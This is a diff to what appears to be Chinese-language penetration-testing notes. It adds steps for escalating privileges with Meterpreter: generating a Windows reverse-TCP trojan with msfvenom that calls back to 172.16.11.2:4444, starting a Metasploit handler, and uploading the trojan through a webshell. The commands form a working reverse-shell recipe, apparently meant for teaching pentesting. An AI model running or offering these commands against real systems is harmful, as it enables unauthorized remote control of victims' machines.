@@ -212,6 +212,24 @@ shell升级为meterpreter
 
 meterpreter提权
 -----------------------------------------
+- 前提
+	+ 生成木马
+		``msfvenom -p windows/meterpreter/reverse_tcp lhost=172.16.11.2 lport=4444 -f exe -o /tmp/hack.exe``
+		
+		::
+		
+			默认为32位,如果靶机为64位需要更改为:wiondows/x64/meterpreter/reverse_tcp
+			反弹到的监听端地址为172.16.11.2，监听端口为4444，文件输出格式为exe并保存到路径/tmp/hack.exe
+	+ 执行监听
+		::
+		
+			use exploit/multi/handler
+			set payload windows/meterpreter/reverse_tcp
+			set LHOST 172.16.11.2
+			show options
+			exploit
+	+ 上传并执行木马
+		此处假设我们通过一系列的渗透测试得到了目标机器的webshell，并上传生成的木马hack.exe，执行成功。
 - getsystem提权
 - exp提权
 	::
